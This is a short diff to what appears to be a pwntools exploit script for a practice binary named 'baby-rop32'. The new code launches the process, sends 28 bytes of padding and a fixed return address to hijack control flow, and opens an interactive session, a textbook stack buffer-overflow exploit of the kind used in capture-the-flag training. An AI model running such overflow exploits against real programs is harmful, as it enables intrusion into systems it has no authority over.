@@ -3,5 +3,6 @@
 from pwn import *
 import sys
 
-if sys.argv[1] == '32':
-    sys.stdout.write('a'*28 + p32(0x8048456))
+p = process('./baby-rop32')
+p.write('a'*28 + p32(0x8048456))
+p.interactive()
